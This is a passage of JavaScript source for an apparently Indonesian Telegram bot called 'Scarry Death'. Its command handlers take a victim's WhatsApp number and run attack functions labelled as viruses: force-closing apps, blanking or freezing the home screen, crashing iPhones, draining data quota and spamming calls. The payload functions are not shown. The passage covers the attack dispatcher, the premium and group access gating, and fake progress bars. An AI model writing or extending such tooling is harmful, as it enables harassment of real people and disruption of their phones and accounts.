  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/blankhome")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (isGroupOnly() && chatType === "private") {
  return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
}

// kalau command ini hanya boleh di group yang sudah diizinkan:
if (chatType !== "private" && !isGroupAllowed(chatId)) {
  return bot.sendMessage(chatId, "Group ini belum diizinkan oleh owner.");
}

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/blankhome")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /blankhome
⪧ Virus  : Blank Home Not Work All Device
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await blankraraa2(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/fcscarry (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/fcscarry")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /fcscarry
⪧ Virus  : Forclose Mode Hard C1
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ 𝓢𝓬𝓪𝓻𝓻𝔂 𝓓𝓮𝓪𝓽𝓱 𝓥 107 𝓖𝓮𝓷 87
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await blankraraa3(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/dhdjdd (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
    
  if (!isCmdActive("/forcecall")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/delaymaker")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /forcecall
⪧ Virus  : Forclose call
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await delayraraa2(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/jdjshdjd (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/drainkuota")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/drainkuota")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /drainkuota
⪧ Virus  : drain kuota
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await delayraraa3(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/spamcall (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/spamcall")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/fcsticker")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /spamcall
⪧ Virus  : Call Spam
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await forceraraa1(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/jdjdbd (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/frezehome")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/mentioninvis")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /frezehome
⪧ Virus  : Freze Home Device
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await iosraraa1(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/fciphone (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/fciphone")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/fciphone")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /fciphone
⪧ Virus  : force close iphone 
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await iosraraa2(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/blankclick (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/blankclick")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /blankclick.");
}
    
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/blankclick")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /blankclick
⪧ Virus  :  Blank Click Newslatter
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ 𝓢𝓬𝓪𝓻𝓻𝔂 𝓓𝓮𝓪𝓽𝓱
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await forceraraa2(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
